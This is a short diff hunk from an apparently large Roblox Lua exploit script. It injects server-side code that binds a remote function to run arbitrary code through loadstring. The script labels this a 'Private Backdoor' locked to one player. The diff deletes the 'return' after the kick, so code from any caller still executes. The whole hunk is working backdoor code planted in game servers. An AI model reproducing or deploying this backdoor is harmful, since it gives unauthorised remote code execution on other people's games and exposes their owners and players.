@@ -2483,7 +2483,6 @@ fireRemoteEvent([[
 	remoteFunction.OnServerInvoke = function(player, code)
 	    if player.Name ~= "]] .. game.Players.LocalPlayer.Name .. [[" then
 	        player:Kick("Backdoor has been secured by Patruck - Private Backdoor.")
-	        return
 	    end
 	    loadstring(code)()
 	end
